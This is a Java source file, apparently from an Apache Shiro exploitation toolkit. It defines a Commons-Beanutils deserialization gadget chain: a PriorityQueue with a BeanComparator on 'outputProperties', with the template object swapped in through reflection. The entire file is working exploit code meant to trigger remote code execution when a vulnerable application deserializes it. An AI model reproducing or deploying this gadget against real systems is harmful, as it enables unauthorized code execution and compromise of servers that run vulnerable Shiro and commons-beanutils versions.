package com.sma11new.exp.shiro.attack.payloads;

import com.sma11new.exp.shiro.attack.payloads.annotation.Authors;
import com.sma11new.exp.shiro.attack.payloads.annotation.Dependencies;
import com.sma11new.exp.shiro.attack.util.Reflections;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.lang3.compare.ObjectToStringComparator;

import java.util.PriorityQueue;
import java.util.Queue;

@Dependencies(value={"commons-beanutils:commons-beanutils:1.9.2"})
@Authors(value={"\u6c34\u6ef4"})
public class CommonsBeanutilsObjectToStringComparator
implements ObjectPayload<Queue<Object>> {
    @Override
    public Queue<Object> getObject(Object template) throws Exception {
        ObjectToStringComparator stringComparator = new ObjectToStringComparator();
        BeanComparator beanComparator = new BeanComparator(null, new ObjectToStringComparator());
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
        queue.add(stringComparator);
        queue.add(stringComparator);
        Reflections.setFieldValue(queue, "queue", new Object[]{template, template});
        Reflections.setFieldValue(beanComparator, "property", "outputProperties");
        return queue;
    }
}

